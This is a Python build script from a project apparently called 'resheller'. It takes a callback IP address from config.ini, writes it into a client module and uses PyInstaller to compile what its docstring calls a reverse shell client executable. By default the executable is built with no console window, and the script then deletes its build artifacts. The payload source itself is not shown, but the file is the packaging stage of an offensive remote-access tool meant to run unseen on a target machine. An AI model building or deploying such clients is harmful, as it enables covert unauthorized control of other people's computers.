#!/usr/bin/env python3
"""build"""
import sys
from configparser import ConfigParser
from ipaddress import IPv4Address
from os import path, name, rename, remove
from shutil import copyfile, rmtree
from subprocess import call, DEVNULL

from root_finder import get_project_root

from lib.stdout import COLOR
from src.build.parser import parser


class Build:
    """Call to resolve config paths and create uninitiated configs"""

    def __init__(self, args) -> None:
        self.repo = get_project_root("resheller")
        self.config = path.join(self.repo, "config.ini")
        self.package = path.join(self.repo, "resheller")
        self.stdout = None if args.verbose else DEVNULL
        self.console = "" if args.console else "--noconsole"
        self.client = args.name if args.name else "client"

    def write_ip_py(self, ipv4: str) -> None:
        """Write importable module with data taken from the `config.ini` file

        :param ipv4: IP of target host or instruction to add IP
        """
        ip_py = path.join(self.package, "src", "client", "ip.py")
        with open(ip_py, "w") as file:
            file.write("#!/usr/bin/env python3\n")
            file.write('"""resheller.src.client.ip"""\n\n\n')
            file.write("def get_ip():\n")
            file.write(f'    """This IP will be compiled into executable"""\n')
            file.write(f"    return {ipv4}\n")

    def make_config(self) -> None:
        """Copy a new `config.ini` file from default template, `default.ini`"""
        default = path.join(self.package, "lib", "default.ini")
        copyfile(default, self.config)

    def parse_config(self) -> str:
        """Read IP address from the `config.ini` file

        :return: Configured IP address
        """
        config = ConfigParser()
        config.read(self.config)
        return config["IP"]["server"]

    @staticmethod
    def verify_ipv4(ipv4: str) -> bool:
        """Ensure IP address is a valid IPv4 address

        :param ipv4: Configured IP address
        """
        try:
            IPv4Address(ipv4.strip('"'))
            return True
        except ValueError as err:
            if "Enter target IP here" in ipv4:
                COLOR.red.print("Enter target's IP in the `config.ini` file")
            else:
                COLOR.b_red.print(f"Not a valid IPv4 Address\n   {err}")
            return False

    def make_exe(self) -> int:
        """Run Pyinstaller to build reverse shell client executable

        :return: Exit code for successful/unsuccessful build
        """
        client_py = path.join(self.package, "src", "client", "main.py")
        name_ = f"--name {self.client}"
        cmd = f"pyinstaller {name_} --onefile {self.console} {client_py}"
        return call(cmd, stdout=self.stdout, stderr=self.stdout, shell=True)

    def move_client(self) -> None:
        """Move client executable to repo root before removing the
        build artifacts
        """
        client_exe = f"{self.client}.exe" if name == "nt" else self.client
        client_src = path.join(self.repo, "dist", client_exe)
        client_dst = path.join(self.repo, client_exe)
        rename(client_src, client_dst)

    def remove_artifacts(self):
        rmtree(path.join(self.repo, "build"))
        rmtree(path.join(self.repo, "dist"))
        remove(path.join(self.repo, f"{self.client}.spec"))
        remove(self.config)


def main() -> None:
    """Run the build process initiated by build.py or Makefile"""
    args = parser()
    COLOR.b_grn.print("[Building]")
    build = Build(args)
    if not path.isfile(build.config):
        build.make_config()
        COLOR.grn.print("Initiated config.ini")
        COLOR.ylw.print("Enter target's IP in config then run build again")
        sys.exit(0)
    ipv4 = build.parse_config()
    if not build.verify_ipv4(ipv4):
        sys.exit(1)
    build.write_ip_py(ipv4)
    COLOR.grn.print("Building client")
    if build.make_exe():
        COLOR.b_red.print("Error building client")
        sys.exit(1)
    else:
        COLOR.b_grn.print("Build successful\n")
    build.move_client()
    if not args.keep:
        build.remove_artifacts()
    build.write_ip_py('"Enter target IP here"')
